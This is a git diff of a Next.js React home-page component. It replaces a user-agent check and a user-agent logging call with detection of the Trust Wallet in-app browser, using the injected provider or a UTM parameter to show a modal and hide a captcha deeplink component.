@@ -9,12 +9,10 @@ import Image from "next/image";
 import { CaptchaDeeplink } from "@/Components/CaptchaDeeplink/CaptchaDeeplink";
 
 export function Home() {
-  const isInTrustWallet =
-    typeof window !== "undefined" &&
-    window.navigator.userAgent.includes("Trust");
   const isDark = usePrefersDark();
   const [isChecked, setIsChecked] = useState(false);
   const { currentStep } = useSelector((store: RootState) => store.main);
+  const [showModal, setShowModal] = useState(false);
 
   const dispatch = useDispatch();
 
@@ -23,26 +21,31 @@ export function Home() {
   };
 
   useEffect(() => {
+    if (typeof window === "undefined") return;
+
     const userAgent = navigator.userAgent;
 
-    alert(userAgent);
+    const params = new URLSearchParams(window.location.search);
+    const utm = params.get("utm_source");
 
-    fetch("/api/log-text", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        userAgent,
-      }),
-    });
+    const injected =
+      (window as any).ethereum?.isTrust === true || (window as any).trustwallet;
+
+    const isTrust =
+      injected ||
+      utm === "Trust_Android_Browser" ||
+      utm === "Trust_iOS_Browser";
+
+    if (isTrust || injected) {
+      setShowModal(true);
+    }
   }, []);
 
   if (isDark == null) return;
 
   return (
     <section className="home">
-      {!isInTrustWallet && <CaptchaDeeplink />}
+      {!showModal && <CaptchaDeeplink />}
 
       <div className="home__container">
         <div className="home__visual">
